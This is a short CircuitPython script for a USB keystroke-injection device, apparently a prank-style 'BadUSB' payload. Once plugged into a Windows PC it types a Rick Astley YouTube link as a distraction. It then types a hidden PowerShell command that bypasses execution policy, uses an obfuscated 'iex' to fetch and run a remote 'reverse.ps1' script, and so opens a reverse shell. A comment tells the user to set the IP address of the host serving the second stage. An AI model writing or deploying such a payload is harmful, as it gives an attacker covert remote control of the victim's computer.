import time
import board
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

# Allow system time to recognize device
time.sleep(1)  

# Open Windows Run dialog
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(1.2)

# Open Rick Astley YouTube video in default browser
layout.write("https://www.youtube.com/watch?v=dQw4w9WgXcQ\n")

time.sleep(1.2)

# Open Windows Run dialog
kbd.send(Keycode.GUI, Keycode.R)

time.sleep(1.2)

# First Stage of Powershell Reverse Shell - change the IP address to where you're hosting the second stage
layout.write("cmd /c start powershell -w hidden -ep Bypass -c ")
layout.write("\"$x='http://192.168.121.143/reverse.ps1';i`e`x (iwr $x)\"\n")

